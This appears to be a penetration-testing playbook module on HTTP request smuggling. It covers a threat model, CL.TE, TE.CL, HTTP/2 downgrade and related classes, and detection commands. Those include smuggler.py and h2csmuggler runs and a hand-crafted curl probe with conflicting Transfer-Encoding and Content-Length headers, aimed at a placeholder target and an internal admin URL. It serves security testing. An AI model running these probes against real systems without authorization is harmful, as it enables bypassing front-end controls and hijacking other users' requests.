# VULN MODULE — HTTP Request Smuggling
# Asset: webapp
# Report ID prefix: WEB-HRS

## THREAT MODEL

HTTP Request Smuggling exploits disagreements between a front-end proxy
(load balancer / CDN) and a back-end server about where one HTTP request ends
and another begins (Content-Length vs Transfer-Encoding: chunked).

Impact:
  - Bypass front-end security controls (WAF, auth proxy)
  - Poison the back-end connection to steal other users' requests
  - Achieve XSS by hijacking a victim's session mid-request
  - Access internal admin endpoints through the back-end connection

## VULNERABILITY CLASSES

1. CL.TE — Front-end uses CL, back-end uses TE   CWE-444  — Critical
2. TE.CL — Front-end uses TE, back-end uses CL   CWE-444  — Critical
3. TE.TE — Both use TE but disagree on parsing    CWE-444  — High
4. HTTP/2 Downgrade Smuggling                     CWE-444  — Critical
5. Response Queue Poisoning                       CWE-444  — High

## DETECTION

```bash
# Automated detection with smuggler
pip install requests-toolbelt
python3 smuggler.py -u https://target.com/

# h2csmuggler for HTTP/2
go install github.com/assetnote/h2csmuggler@latest
h2csmuggler -x https://target.com/ http://internal-backend/admin

# Manual CL.TE test (time-based detection)
# If 10 second delay → CL.TE smuggling likely
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  --data-binary $'3\r\nabc\r\nX'
# Sends: CL says 6 bytes, TE says 3 bytes then incomplete chunk
# Backend waiting for rest of chunk = 10s timeout = vulnerable
```

## TOOLS

```bash
# Burp Suite Pro — HTTP Request Smuggler extension (James Kettle)
# BApp Store → HTTP Request Smuggler

# smuggler.py
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com/ -m POST
```
